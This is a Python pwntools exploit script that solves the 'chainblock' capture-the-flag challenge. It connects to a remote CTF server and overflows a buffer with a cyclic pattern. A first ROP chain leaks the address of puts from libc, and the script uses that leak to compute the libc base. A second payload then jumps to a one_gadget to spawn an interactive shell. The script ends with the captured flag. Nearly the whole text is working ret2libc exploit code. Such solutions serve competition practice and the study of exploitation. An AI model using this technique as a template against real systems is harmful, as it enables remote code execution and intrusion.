

#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chainblock")
libc = ELF('./libc.so.6')
context.log_level = "DEBUG"
# 0x00000000004011fe
gs = '''
break *0x00000000004011fe
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return remote('pwn.be.ax', 5000)
        return process(elf.path)

# Index of allocated chunks.
print(elf.plt)
print('puts> ', elf.plt['puts'])
io = start()

PUTS_PLT = p64(elf.plt['puts']) #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = p64(elf.symbols['main'])
POP_RDI = p64(0x401493)
PUTS_GOT = p64(elf.got['puts']) #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("Please enter your name:")
#libc.address = int(io.recvline(), 16) - libc.sym.puts
#io.timeout = 0.1

comp=b''
msf=cyclic_metasploit(264-len(comp))
ret=POP_RDI+PUTS_GOT+PUTS_PLT+MAIN_PLT
GADGET_POPS=p64(0x000000000040148c)

exp=msf+ret
print(exp)
io.sendline(exp)
io.recvuntil('KYC failed, wrong identity!\n')
leak=io.recvline()[:-1]
leak=hex(u64(leak.ljust(8, b'\x00')))
base=hex(int(leak,16)-libc.symbols['puts'])
one=int(base,16)+0xde78c
#log.info('Puts leak: {}'.format(hex(leak)))
print('leak_puts',leak)
print('base_libc',base)
print('one', one)
exploit2=msf+GADGET_POPS+p64(0)*4+p64(one)
io.sendline(exploit2)
io.interactive()
#corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}
